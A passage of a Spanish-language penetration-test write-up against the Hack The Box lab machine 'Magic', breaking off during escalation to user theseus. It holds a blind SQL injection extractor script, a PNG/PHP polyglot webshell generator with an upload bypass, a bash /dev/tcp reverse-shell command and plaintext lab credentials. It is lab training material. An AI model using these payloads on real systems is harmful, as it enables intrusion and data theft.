# Informe Red Team — Hack The Box · "Magic"

> Documento técnico con el detalle completo de la explotación, paso a paso:
> razonamiento, comandos ejecutados, respuestas del objetivo, intentos fallidos y
> explicación técnica de cada vulnerabilidad aprovechada.

---

## Índice

1. [Ficha de la operación](#1-ficha-de-la-operación)
2. [Resumen ejecutivo](#2-resumen-ejecutivo)
3. [Fase 0 — Preparación y metodología](#3-fase-0--preparación-y-metodología)
4. [Fase 1 — Reconocimiento de puertos y servicios](#4-fase-1--reconocimiento-de-puertos-y-servicios)
5. [Fase 2 — Enumeración y análisis de la aplicación web](#5-fase-2--enumeración-y-análisis-de-la-aplicación-web)
6. [Fase 3 — SQL Injection en `login.php`](#6-fase-3--sql-injection-en-loginphp)
7. [Fase 4 — Bypass del upload y obtención de RCE](#7-fase-4--bypass-del-upload-y-obtención-de-rce)
8. [Fase 5 — Post-explotación como `www-data`](#8-fase-5--post-explotación-como-www-data)
9. [Fase 6 — Escalada a usuario `theseus`](#9-fase-6--escalada-a-usuario-theseus)
10. [Fase 7 — Escalada a `root`](#10-fase-7--escalada-a-root)
11. [Flags obtenidas](#11-flags-obtenidas)
12. [Diagrama de la cadena de ataque](#12-diagrama-de-la-cadena-de-ataque)
13. [Análisis de vulnerabilidades y CVSS](#13-análisis-de-vulnerabilidades-y-cvss)
14. [Intentos fallidos y lecciones aprendidas](#14-intentos-fallidos-y-lecciones-aprendidas)
15. [Recomendaciones de remediación](#15-recomendaciones-de-remediación)
16. [Artefactos y limpieza](#16-artefactos-y-limpieza)

---

## 1. Ficha de la operación

| Campo | Valor |
|---|---|
| Objetivo | Máquina **Magic** — Hack The Box (laboratorio autorizado) |
| IP | `10.129.76.13` |
| Hostname | `magic` |
| Fecha de ejecución | 2026-09-24 |
| IP del operador (VPN) | `10.10.17.247` (tun0) |
| SO objetivo | Ubuntu 18.04.4 LTS (Bionic Beaver), kernel `5.3.0-42-generic` |
| Servicios detectados | 22/tcp (OpenSSH 7.6p1), 80/tcp (Apache 2.4.29 + PHP) |
| Resultado | **PWNED** — user flag y root flag obtenidas |
| Directorio de trabajo | `/home/kali/htb/magic/` |

### Credenciales descubiertas

| Contexto | Usuario | Contraseña | Utilidad |
|---|---|---|---|
| Web (`Magic.login`) | `admin` | `Th3s3usW4sK1ng` | Bypass de login vía SQLi (también válida directamente) |
| MySQL (`db.php5`) | `theseus` | `iamkingtheseus` | Cuenta de base de datos (no sirve en Linux) |
| Sistema Linux | `theseus` | `Th3s3usW4sK1ng` | `su theseus` → user flag |
| SSH (22/tcp) | — | — | **No accesible**: para `theseus` solo acepta `publickey` |

---

## 2. Resumen ejecutivo

La máquina expone un portfolio web con autenticación. La aplicación presenta **tres
vulnerabilidades encadenadas**:

1. **SQL Injection sin autenticar** en `login.php` → permite entrar sin credenciales y
   extraer la base de datos mediante un oráculo booleano ciego.
2. **Subida de archivos con validación deficiente** → la whitelist solo mira la última
   extensión y la validación de contenido solo comprueba que el archivo sea una imagen
   real; combinado con un `.htaccess` que asigna el handler de PHP a **cualquier nombre
   que contenga `.php`** (regex sin anclar), se consigue ejecución de código remota.
3. **Binario SUID `/bin/sysinfo`** que ejecuta comandos relativos al `PATH` con
   `popen()` manteniendo `euid=0` → escalada directa a root.

Entre medias, la **reutilización de contraseñas** (`Th3s3usW4sK1ng` vale tanto para la
cuenta web como para el usuario del sistema) permite pasar de `www-data` a `theseus`,
requisito para poder ejecutar el binario SUID (que pertenece al grupo `users`).

```
SQLi ──► sesión de administrador ──► upload PNG+PHP (shell.php.png) ──► RCE www-data
   ──► leer db.php5 ──► su theseus (reutilización) ──► FLAG user
   ──► /bin/sysinfo + PATH hijack ──► root ──► FLAG root
```

---

## 3. Fase 0 — Preparación y metodología

### 3.1 Directorio de trabajo

```bash
mkdir -p /home/kali/htb/magic
cd /home/kali/htb/magic
```

Todo archivo generado (salidas de nmap, wordlists de resultados, scripts propios)
se volcó en este directorio para poder revisarlo después.

### 3.2 Metodología seguida

Se siguió la secuencia clásica de un engagement, cargando para ello las skills
disponibles de red team:

| Paso | Skill / herramienta |
|---|---|
| Descubrimiento y enumeración de servicios | `redteam-network` (nmap, ffuf) |
| Análisis de la aplicación web | `redteam-web` (gobuster, nikto, burp) |
| Explotación | `redteam-exploit` |
| Post-explotación | `redteam-postexp` (enumeración, escalada) |

Orden de trabajo real:

1. Escaneo completo de puertos (`-p-`) → nunca asumir que solo están 80/443.
2. Enumeración fina de cada servicio encontrado.
3. Fuzzing de directorios y descubrimiento de endpoints.
4. Pruebas de inyección en el único punto de entrada con parámetros (login).
5. Explotación del panel autenticado (upload).
6. Enumeración interna del sistema y escalada por niveles (www-data → theseus → root).
7. Limpieza de artefactos y documentación.

---

## 4. Fase 1 — Reconocimiento de puertos y servicios

### 4.1 Escaneo completo de puertos

```bash
nmap -sS -sV -sC -O -p- -T4 --min-rate 1000 -oA nmap_full 10.129.76.13
```

| Flag | Propósito |
|---|---|
| `-sS` | Escaneo SYN (half-open: no completa el handshake TCP) |
| `-sV` | Detección de versiones de servicio (sondeo de banners) |
| `-sC` | Ejecuta los scripts por defecto de nmap (aquí `ssh-hostkey`, `http-title`, `http-server-header`) |
| `-O` | Estimación del sistema operativo |
| `-p-` | Los 65535 puertos TCP |
| `-T4` | Timing agresivo (la VPN de HTB tiene latencia) |
| `--min-rate 1000` | Fuerza un mínimo de paquetes/segundo para que termine en tiempo razonable |
| `-oA nmap_full` | Guarda en los 3 formatos: `.nmap`, `.gnmap`, `.xml` |

**Salida (245 s de escaneo):**

```
Nmap scan report for magic.htb (10.129.76.13)
Host is up (0.13s latency).
Not shown: 58715 closed tcp ports (reset), 6818 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
```

**Interpretación:**

- Solo **dos puertos TCP abiertos**: 22 y 80. No hay SMB, no hay 443, no hay bases de
  datos expuestas fuera (MySQL está en `localhost`).
- `OpenSSH 7.6p1 Ubuntu` → Ubuntu 18.04. SSH es un candidato a fuerza bruta o a
  reutilización de credenciales, pero se intentará al final.
- `Apache httpd 2.4.29` → también de Ubuntu 18.04; el `http-title: Magic Portfolio`
  identifica la aplicación.
- `Network Distance: 2 hops` → confirmamos que vamos por la VPN de HTB.
- Se descarta tratar de explotar servicios auxiliares porque no existen.

### 4.2 Siguiente paso

Con solo HTTP expuesto, el foco pasa íntegramente a la aplicación web.

---

## 5. Fase 2 — Enumeración y análisis de la aplicación web

### 5.1 Cabeceras HTTP

```bash
curl -sI http://10.129.76.13/
```

```
HTTP/1.1 200 OK
Date: ...
Server: Apache/2.4.29 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

- No hay cabeceras de seguridad (`X-Frame-Options`, `CSP`, `HSTS`), irrelevante aquí pero
  anotable.
- No se anuncia ningún framework (sin `X-Powered-By`) → PHP embebido en Apache.

### 5.2 Contenido de la página principal

```bash
curl -s http://10.129.76.13/
```

Puntos de interés extraídos del HTML:

```html
<title>Magic Portfolio</title>
...
<article class="item thumb span-2"><h2>11a9eabc</h2>
  <a href='images/fulls/5.jpeg' class='image'><img src='images/fulls/5.jpeg'></a>
</article>
...
<article class="item thumb span-3"><h2>18b5b7d3</h2>
  <a href='images/uploads/magic-hat_23-2147512156.jpg' ...>
</article>
...
<p>Please <strong><a href="login.php">Login</a></strong>, to upload images.</p>
...
<div class="copyright"> &copy; Magic | 4d61676963 </div>
```

**Conclusiones:**

1. Existe **`login.php`** y la página indica que hacer login permite **subir imágenes**
   → superficie de ataque principal: autenticación + upload.
2. Hay dos zonas de imágenes: `images/fulls/` (incluidas en el paquete) e
   **`images/uploads/`** (subidas por usuarios) → directorio de escritura en el webroot.
3. `4d61676963` es el hex de la cadena `Magic` → solo temática, sin vector.
4. Los `<h2>` con hash son títulos de las imágenes (hashes cortos), sin parámetros
   reflejados → no hay XSS/reflejo evidente en la portada.

### 5.3 Fuzzing de directorios

**Primer barrido (wordlist corta):**

```bash
ffuf -u http://10.129.76.13/FUZZ -w /usr/share/wordlists/dirb/common.txt \
     -mc 200,301,302,403 -t 50 -o ffuf_common.json -of json
```

Resultados:

```
/assets            [301]
/images            [301]
/index.php         [200]
/.htpasswd         [403]
/.htaccess         [403]
/.htaccess         [403]
/.sh_history       [403]
/.hta              [403]
/server-status     [403]
```

- Los 403 de archivos `.ht*` son el comportamiento por defecto de Apache (niega el
  acceso a *dotfiles*), no implica que existan.
- `server-status` 403 → el módulo está presente pero restringido.

**Segundo barrido (wordlist media + extensiones):**

```bash
gobuster dir -u http://10.129.76.13/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,bak,zip -t 50 -q -o gob_medium.txt
```

```
images       (301) → http://10.129.76.13/images/
index.php    (200)
login.php    (200)
assets       (301) → http://10.129.76.13/assets/
upload.php   (302) → login.php      ← protegido por sesión
logout.php   (302) → index.php
```

**Mapa de la aplicación:**

| Endpoint | Acceso | Función |
|---|---|---|
| `/index.php` | público | Galería de imágenes |
| `/login.php` | público | Formulario de autenticación (POST `username`, `password`) |
| `/upload.php` | requiere sesión | Subida de imágenes |
| `/logout.php` | sesión | Destruye la sesión y redirige a `index.php` |
| `/images/uploads/` | público (lectura) | Almacén de subidas |
| `/assets/` | público | CSS/JS |

No aparecen backups (`.bak`, `.zip`), ni `.git`, ni `robots.txt`, ni `phpinfo.php`.

### 5.4 Análisis del formulario de login

```bash
curl -s http://10.129.76.13/login.php
```

```html
<title>Magic Login</title>
<form id="login-form" method="POST" action="" onsubmit="">
  <input type="text"     name="username" id="username">
  <input type="password" name="password" id="password">
  <button class="button small" type="submit" value="Submit">Login</button>
</form>
```

- `action=""` → se envía a la misma URL (`login.php`).
- `onsubmit=""` → **la validación no es client-side** (no hay JS que impida enviar
  cualquier cosa) → todas las pruebas se pueden hacer con `curl`.
- Dos parámetros → superficie de prueba: SQLi, brute force.

---

## 6. Fase 3 — SQL Injection en `login.php`

### 6.1 Prueba inicial de bypass

```bash
curl -i -X POST http://10.129.76.13/login.php \
  -d "username=admin' OR 1=1-- -&password=x"
```

Respuesta:

```
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=d4r45173pojk41dunndt8mmnj0; path=/
Location: upload.php
```

**Control negativo** (credenciales inventadas):

```bash
curl -i -X POST http://10.129.76.13/login.php \
  -d "username=baduser&password=badpass"
```

```
HTTP/1.1 200 OK          ← vuelve a pintar el formulario
```

**Conclusión:** la comilla cierra el literal de `username`, `OR 1=1` hace que el `WHERE`
sea siempre verdadero y `-- -` comenta el resto de la consulta (incluido el
`AND password=...`). La respuesta **302 → upload.php** contra **200 → login.php** es un
**oráculo booleano perfecto** para toda la fase siguiente.

El cuerpo del 302 sigue siendo el HTML del login (curl no sigue la redirección), por lo
que no hay información reflejada: la inyección es **ciega**.

### 6.2 Estructura de la consulta (reconstruida después)

Al obtener RCE se leyó el código fuente real (`/var/www/Magic/login.php`):

```php
$password = $_POST['password'];
if (strpos(strtolower($username), 'sleep')   === false &&
    strpos(strtolower($password), 'sleep')   === false &&
    strpos(strtolower($username), 'benchmark') === false &&
    strpos(strtolower($password), 'benchmark') === false) {
    ...
    $stmt = $pdo->query("SELECT * FROM login WHERE username='$username' AND password='$password'");
```

- Concatenación directa de los POST en la consulta → **SQLi clásica**.
- Existe un **filtro por blacklist** de `sleep` y `benchmark` → el ataque *time-based*
  está taponado. Por eso se usó **boolean-based** (no depende de temporizadores).

### 6.3 Descubriendo el número de columnas (`UNION`)

Para usar `UNION SELECT` el número de columnas debe coincidir con el de la consulta
original (`SELECT * FROM login` → las columnas de la tabla).

```bash
for n in 1 2 3 4 5 6 7 8; do
  cols=$(python3 -c "print(','.join(['1']*$n))")
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST login.php \
         --data-urlencode "username=admin' UNION SELECT $cols-- -" \
         --data-urlencode "password=x")
  echo "cols=$n -> HTTP $code"
done
```

```
cols=1 -> 200    cols=2 -> 200    cols=3 -> 302    cols=4 -> 200
cols=5 -> 200    cols=6 -> 200    cols=7 -> 200    cols=8 -> 200
```

**3 columnas** es la única que produce 302. Si el número no coincide MySQL lanza un error
de sintaxis → `mysqli/PDO` devuelve 0 filas → respuesta 200.

### 6.4 Montaje del oráculo booleano

La idea: forzar que la consulta `UNION` devuelva **una fila solo si la condición es
verdadera**. Si devuelve filas → el login "funciona" → 302.

```
username = x' UNION SELECT 1,2,3 FROM DUAL WHERE (<condición>)-- -
```

- `x'` hace que la parte original del `WHERE` no coincida con ninguna fila.
- `FROM DUAL` es imprescindible: **MySQL no permite `SELECT ... WHERE` sin tabla**
  (a diferencia del estándar SQL). Sin `DUAL` el oráculo devolvía siempre 200 y el
  primer intento de extracción falló por completo.
- `-- -` comenta el resto (`AND password='...'`).

**Prueba de sanidad:**

| Condición | Respuesta | Esperado |
|---|---|---|
| `1=1` | 302 | ✔ verdadero |
| `1=2` | 200 | ✔ falso |

### 6.5 Automatización: extractor booleano ciego

Script `sqli_extract.py` (versión final):

```python
ORACLE_TRUE = 302

def oracle(cond):
    payload = f"x' UNION SELECT 1,2,3 FROM DUAL WHERE ({cond})-- -"
    r = requests.post(URL, data={"username": payload, "password": "x"},
                      timeout=30, allow_redirects=False)
    return r.status_code == ORACLE_TRUE

def extract(expr, maxlen=60):
    out = ""
    for i in range(1, maxlen + 1):
        a, b = 32, 126                      # rango ASCII imprimible
        # si el carácter es < 33 -> fin de cadena
        if not oracle(f"ORD(SUBSTRING(({expr}),{i},1))>=33"):
            break
        while a < b:                        # búsqueda binaria
            mid = (a + b + 1) // 2
            if oracle(f"ORD(SUBSTRING(({expr}),{i},1))>={mid}"):
                a = mid
            else:
                b = mid - 1
        out += chr(a)
    return out
```

**Cómo funciona:**

1. `SUBSTRING(expr, i, 1)` extrae el carácter i-ésimo del resultado de la expresión.
2. `ORD()` devuelve su código ASCII.
3. Se hace **búsqueda binaria** entre 32 y 126: en cada iteración se pregunta
   `ORD(...) >= mitad` y se reduce el intervallo a la mitad → **7 peticiones por
   carácter** como máximo (log₂ 94 ≈ 6.6).
4. Si `ORD(...) < 33` se asume fin de cadena (`0` = terminador de MySQL).
5. Cada petición es un POST completo con nueva conexión; se reintenta en caso de timeout
   (la VPN de HTB sufre pérdidas puntuales).

Coste aproximado: 7 peticiones × ~30 caracteres ≈ 200 POST ≈ 2 minutos por dato.

### 6.6 Explotación: extracción de datos

| # | Expresión SQL | Resultado |
|---|---|---|
| 1 | `database()` | `Magic` |
| 2 | `SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=0x4d61676963` | `login` |
| 3 | `SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x6c6f67696e` | `id, username, password` |
| 4 | `SELECT GROUP_CONCAT(username,0x3a,password) FROM login` | **`admin:Th3s3usW4sK1ng`** |

Notas técnicas de la extracción:

- Los literales de cadena se codifican en **hexadecimal** (`0x4d61676963` = `Magic`,
  `0x6c6f67696e` = `login`) para no romper las comillas simples del payload.
- `GROUP_CONCAT` concatena todas las filas en una sola cadena, evitando tener que
  paginar con `LIMIT n,1`.
- Hubo **2 timeouts** que distorsionaron un par de caracteres (el reintento automático
  los corrigió): se obtuvo `usernZme`/`passwoqd` que se interpretaron como
  `username`/`password` por contexto.
- `GROUP_CONCAT` está limitado a 1024 bytes por defecto: suficiente en este caso.

### 6.7 Verificación de las credenciales

```bash
curl -X POST http://10.129.76.13/login.php \
  -d "username=admin&password=Th3s3usW4sK1ng"
# → 302 Location: upload.php   ✔ login legítimo
```

Y en SSH (varios usuarios, mismo patrón):

```python
paramiko.connect(..., username=u, password="Th3s3usW4sK1ng")
# admin, root, magic, www-data, ubuntu, user, george, theshebang, apache, mysql, test, htb
# → todos AuthenticationException
```

**La contraseña es válida en la web pero no en SSH todavía.**

---

## 7. Fase 4 — Bypass del upload y obtención de RCE

### 7.1 Acceso al panel

Con la sesión abierta (`PHPSESSID` en `cookies.txt`):

```bash
curl -b cookies.txt http://10.129.76.13/upload.php
```

```html
<title>Magic Upload</title>
<h1>Welcome Admin!</h1>
<form action="" method="POST" enctype="multipart/form-data">
  <div class="dropzone">
    <input type="file" class="input" name="image">
  </div>
  <input class="upload-btn" type="submit" value="Upload Image" name="submit">
</form>
<a href="logout.php">Logout</a>
```

- Campo de archivo: **`image`**.
- `enctype="multipart/form-data"` → subida clásica de PHP (`$_FILES['image']`).
- El JS asociado (`assets/js/upload.js`) **solo** pinta el nombre del archivo en la
  interfaz: **toda la validación es server-side**.

### 7.2 Primera batería de pruebas (intentos fallidos)

Payload base: `GIF89a<?php echo "PWNED".php_uname(); ?>` guardado con distintos nombres.

| # | Nombre del archivo | Contenido | Respuesta del servidor |
|---|---|---|---|
| 1 | `shell.php` | GIF+PHP | `Sorry, only JPG, JPEG & PNG files are allowed.` |
| 2 | `t.php.gif` | GIF+PHP | `Sorry, only JPG, JPEG & PNG...` |
| 3 | `t.gif.php` | GIF+PHP | `Sorry, only JPG, JPEG & PNG...` |
| 4 | `shell.phtml` | GIF+PHP | `Sorry, only JPG, JPEG & PNG...` |
| 5 | `shell.php5` | GIF+PHP | `Sorry, only JPG, JPEG & PNG...` |
| 6 | `shell.phar` | GIF+PHP | `Sorry, only JPG, JPEG & PNG...` |
| 7 | `shell.php` con `Content-Type: image/png` | GIF+PHP | `Sorry, only JPG, JPEG & PNG...` |
| 8 | `shell.pHp` | GIF+PHP | `Sorry, only JPG, JPEG & PNG...` |

**Lectura:** hay una **whitelist de extensión** (`jpg|jpeg|png`) aplicada al nombre del
archivo, **case-insensitive** y que mira la **última** extensión. El `Content-Type` del
multipart **no se tiene en cuenta** (es controlable por el cliente y lo comprobamos).

### 7.3 Segunda batería: identificando la validación de contenido

| # | Nombre | Contenido | Respuesta |
|---|---|---|---|
| 9 | `test.png` | PNG 1x1 válido | ✔ **subido** (aparece en `index.php` como `images/uploads/test.png`) |
| 10 | `x.png` | `GIF89a<?php ...?>` (sin estructura de imagen) | `What are you trying to do there?` |
| 11 | `y.png` | PNG válido **con `<?php` añadido tras IEND** | ✔ **subido** |
| 12 | `x.php.png` | PNG válido | ✔ **subido** (68 bytes, idéntico al original) |
| 13 | `x.phtml.png` | PNG válido | ✔ subido |

**Conclusiones:**

- El servidor valida que el archivo sea una **imagen real** (`getimagesize()` /
  `exif_imagetype()`), no busca la cadena `<?php` → el test 11 demuestra que se puede
  **embeber código PHP dentro de un PNG válido**.
- El test 12 demuestra que **el nombre sí puede contener `.php`** siempre que la última
  extensión sea `png`.

### 7.4 Tercera batería: ¿se puede acabar en `.php`?

| # | Nombre | Respuesta |
|---|---|---|
| 14 | `x.png.php` | `Sorry, only JPG, JPEG & PNG...` |
| 15 | `x.jpg.php` | `Sorry, only JPG, JPEG & PNG...` |
| 16 | `x.jpeg.php` | `Sorry, only JPG, JPEG & PNG...` |
| 17 | `x.png.phtml` | `Sorry, only JPG, JPEG & PNG...` |
| 18 | `x.png.php5` | `Sorry, only JPG, JPEG & PNG...` |
| 19 | `x.png.PhP` | `Sorry, only JPG, JPEG & PNG...` |
| 20 | `x.png.php.` | `Sorry, only JPG, JPEG & PNG...` |

**Lectura:** la whitelist está **anclada al final** del nombre (equivalente a
`pathinfo($name, PATHINFO_EXTENSION)`). No hay forma directa de que el archivo termine
en `.php`.

Pruebas adicionales descartadas:

- **Null byte** (`shell.php\0.png`): PHP ≥ 5.3.4 rechaza rutas con `\0` → no funciona.
- **PUT/WebDAV** (`curl -X PUT .../puttest.php`): `404`.
- **`.htaccess` subido**: la extensión `htaccess` no está en la whitelist.

### 7.5 Hallazgo decisivo: el `.htaccess` del webroot

Tras conseguir RCE se leyó `/var/www/Magic/.htaccess`:

```apache
<FilesMatch ".+\.ph(p([3457s]|\-s)?|t|tml)">
SetHandler application/x-httpd-php
</FilesMatch>

<Files ~ "\.(sh|sql)">
   order deny,allow
   deny from all
</Files>
```

**Por qué esto es vulnerable (explicación técnica):**

1. `<FilesMatch>` de Apache evalúa el regex contra **el nombre base del archivo**.
2. El patrón **no está anclado con `$`**: `.+\.php` significa "cualquier cosa, un punto,
   `php`" **en cualquier posición**, no solo al final.
3. `SetHandler application/x-httpd-php` fuerza a Apache a **procesar como PHP** cualquier
   archivo que haga match.
4. Por tanto, `shell.php.png`:
   - La whitelist de PHP solo mira la última extensión → `png` → **aceptada**.
   - El `FilesMatch` detecta `.php` en medio del nombre → **handler de PHP aplicado**.
5. La segunda regla (`<Files ~ "\.(sh|sql)">`) solo bloquea `.sh` y `.sql`, no `.png`.

Esta configuración es un clásico error de Apache+PHP: el patrón correcto debería ser
`\.php$` (o usar `<FilesMatch "\.ph(ar|p|tml)$">` como hace por defecto el paquete PHP
oficial de Ubuntu).

### 7.6 Construcción del payload polímorfico

Script `mkpoly.py`:

```python
import struct, zlib, sys

def chunk(t, d):
    c = struct.pack('>I', len(d)) + t + d
    return c + struct.pack('>I', zlib.crc32(t + d) & 0xffffffff)

# PNG mínimo válido de 1x1 (color tipo 2 = RGB, 8 bits)
png = (b'\x89PNG\r\n\x1a\n'
       + chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))
       + chunk(b'IDAT', zlib.compress(b'\x00\x00\x00\x00\x00'))
       + chunk(b'IEND', b''))

# PHP añadido DESPUÉS del chunk IEND -> la imagen sigue siendo válida
payload = b'\n<?php echo "PWNED_OK\\n"; if(isset($_GET["c"])){passthru($_GET["c"]);} ?>'
open(sys.argv[1], 'wb').write(png + payload)
```

**Por qué funciona:**

- `getimagesize()`/`exif_imagetype()` leen la cabecera y los chunks `IHDR`/`IDAT`/`IEND`
  → reconocen un PNG válido e **ignoran cualquier byte posterior a `IEND`** → supera la
  validación de contenido.
- Al ser ejecutado como PHP, el binario PNG se imprime tal cual (PHP solo interpreta lo
  que está entre `<?php` y `?>`) y a continuación se ejecuta el código.

### 7.7 Subida y confirmación de ejecución

```bash
curl -c cookies.txt -X POST login.php -d "username=admin' OR 1=1-- -&password=x"
curl -b cookies.txt -F "image=@poly2.png;filename=rce.php.png;type=image/png" \
     -F "submit=Upload Image" http://10.129.76.13/upload.php
# sin alert() -> subida correcta

curl -s "http://10.129.76.13/images/uploads/rce.php.png"
# <bytes PNG>\nPWNED_OK

curl -s "http://10.129.76.13/images/uploads/rce.php.png?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Nota metodológica:** el primer intento de confirmación (archivo `x.php.png` con PNG
> "limpio") devolvía bytes idénticos al original, lo que era **ambiguo**: si PHP lo hubiera
> ejecutado, la salida sería exactamente la misma (no hay código). La confirmación real
> llegó con el polímorfico que sí contiene `<?php`, que imprimió `PWNED_OK`.
>
> Adicionalmente, al solicitar `poly.png` (extensión final `png` sin `.php`) el servidor
> devolvió los bytes crudos con el `<?php` visible → **el handler solo aplica cuando el
> nombre contiene `.php`**, validando así la hipótesis del `FilesMatch`.

**RCE confirmada como `www-data`.**

### 7.8 Shell reversa

```bash
setsid nohup nc -lvnp 4444 > shell.out 2>&1 < /dev/null & disown
```

```python
import requests
cmd = "bash -c 'bash -i >& /dev/tcp/10.10.17.247/4444 0>&1'"
requests.get("http://10.129.76.13/images/uploads/rce2.php.png",
             params={"c": cmd}, timeout=8)
```

Resultado en el listener:

```
listening on [any] 4444 ...
connect to [10.10.17.247] from (UNKNOWN) [10.129.76.13] 58580
bash: cannot set terminal process group (1156): Inappropriate ioctl for device
bash: no job control in this shell
www-data@magic:/var/www/Magic/images/uploads$
```

**Problemas encontrados y solución:**

1. `pkill -f "nc -lvnp 4444"` mató la propia shell del operador: el patrón `-f` coincide
   con la *cmdline completa* del proceso, incluida la propia línea del `pkill`.
   → Solución: usar un patrón auto-excluyente `"[n]c -lvnp 4444"`.
2. El listener debía quedar **totalmente desenganchado** de la terminal
   (`setsid ... < /dev/null & disown`), si no, la herramienta esperaba indefinidamente a
   que los hijos cerraran el stdout.
3. Los archivos `*.php.png` **desaparecían (404) tras ser ejecutados**, por lo que no se
   podían reutilizar → nace el helper descrito abajo.

### 7.9 Helper de explotación: `rce.py`

Para evitar repetir el proceso a mano y sortear la desaparición de los archivos, se creó
un helper que en cada llamada:

1. Abre sesión con la SQLi (`admin' OR 1=1-- -`).
2. Sube `poly2.png` con un nombre aleatorio `pNNNNN.php.png`.
3. Hace `GET .../pNNNNN.php.png?c=<comando>`.
4. Corta la respuesta en el marcador `IEND` y elimina el prefijo `PWNED_OK`,
   devolviendo **solo la salida del comando**.
5. Reintenta 3 veces si Apache cierra la conexión.

```bash
python3 rce.py "id; hostname"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
# magic
```

---

## 8. Fase 5 — Post-explotación como `www-data`

### 8.1 Identidad y sistema

```bash
python3 rce.py "id; uname -a; hostname; cat /etc/os-release | head -3"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux magic 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 GNU/Linux
magic
NAME="Ubuntu"  VERSION="18.04.4 LTS (Bionic Beaver)"
```

### 8.2 Usuarios y permisos

```bash
python3 rce.py "cat /etc/passwd; ls -la /home/; sudo -n -l"
```

Puntos clave del `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/false
theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash   ← único usuario normal
```

```
/home/:
drwxr-xr-x 15 theseus theseus 4096 ... theseus
-r-------- 1 theseus theseus 33 ... /home/theseus/user.txt   ← flag, solo lectura por theseus
```

`sudo -n -l` → `sudo: a password is required` (y como somos `www-data`, sudo pediría la
contraseña **de www-data**, no de otro usuario) → **descartado**.

### 8.3 Binarios SUID

```bash
python3 rce.py "find / -perm -4000 -type f 2>/dev/null"
```

Lista completa estándar (`passwd`, `sudo`, `pkexec`, `mount`, snaps, etc.) más:

```
/bin/sysinfo   -rwsr-x--- root users 22040 Oct 21 2019
```

**Interpretación inmediata:**

- SUID root → ejecuta como root.
- Permisos `-rwsr-x---` y grupo `users` → **solo root y los miembros de `users` pueden
  ejecutarlo**. `www-data` **no** puede (solo tiene el grupo `33`).
- Requisito: primero convertirse en `theseus` (que sí está en `users`).

### 8.4 Capabilities, cron y servicios

```bash
python3 rce.py "getcap -r / 2>/dev/null | head; cat /etc/crontab; ls -la /etc/cron.d/"
```

- Capabilities: solo binarios estándar de escritorio/red (`gnome-keyring-daemon`,
  `mtr-packet`, `gst-ptp-helper`) → sin `cap_setuid` explotables.
- `/etc/crontab` y `/etc/cron.d/`: solo tareas por defecto de Ubuntu más
  `php` (limpieza de sesiones cada 30 min) y `popularity-contest` → **ninguna tarea
  escribible por www-data**.

### 8.5 Lectura del código fuente

```bash
python3 rce.py "ls -la /var/www/Magic/; grep -rn 'mysqli_connect|password|db_' /var/www/Magic/*.php"
```

```
-rwx---r-x  www-data www-data   .htaccess      ← clave del bypass (ver Fase 4)
-rw-r--r--  www-data www-data   db.php5        ← credenciales de BD
-rw-r--r--  www-data www-data   index.php / login.php / logout.php / upload.php
drwxrwxr-x  www-data www-data   assets/ images/
```

**`db.php5` (no es servible por web: extensión fuera de las que Apache entrega; de hecho
la whitelist de ejecución no la pide y la regla de `FilesMatch` tampoco la procesa):**

```php
private static $dbName         = 'Magic';
private static $dbHost         = 'localhost';
private static $dbUsername     = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

**`upload.php` / `login.php`:** se confirma la SQLi y la validación de upload descritas
en las fases 3 y 4.

### 8.6 Intento de acceso a MySQL

```bash
python3 rce.py "mysql -utheseus -piamkingtheseus -e 'show databases'"
# sh: 1: mysql: not found
```

No hay cliente instalado en el box (aunque sí `mysqldump`/`mysqladmin`); además MySQL
solo escucha en `localhost`, así que no aporta nada nuevo: **ya tenemos toda la base de
datos vía SQLi**.

### 8.7 Archivos legibles en el home de `theseus`

```bash
python3 rce.py "ls -la /home/theseus/; cat /home/theseus/.bash_profile; grep users /etc/group"
```

```
drwx------  .ssh          → ilegible para www-data (no hay claves copiables)
-r--------  user.txt      → flag, permisos 400
lrwxrwxrwx  .bash_history -> /dev/null   → sin historial
-rw-r--r--  .bash_profile -> "unset HISTFILE"
users:x:100:theseus       → only theseus
```

- No hay historial ni claves SSH legibles.
- `Desktop/`, `Documents/`, `Downloads/` están vacíos (0 archivos).
- **No existe ninguna ruta de "password en claro" legible** → hay que probar contraseñas.

### 8.8 SSH descartado

```python
paramiko.connect("10.129.76.13", username="theseus", password="...")
# BadAuthenticationType: allowed types: ['publickey']
```

`sshd` tiene deshabilitada la autenticación por contraseña **para ese usuario**
(probablemente mediante `Match User` en `sshd_config`), por lo que SSH no sirve como
vector de acceso inicial con las credenciales que tenemos.

---

## 9. Fase 6 — Escalada a usuario `theseus`

### 9.1 Reutilización de credenciales

Candidatas disponibles:

| Contraseña | Origen | ¿Probada contra `theseus`? |
|---|---|---|
| `iamkingtheseus` | `db.php5` (usuario MySQL) | ✔ probada → **fallo** |
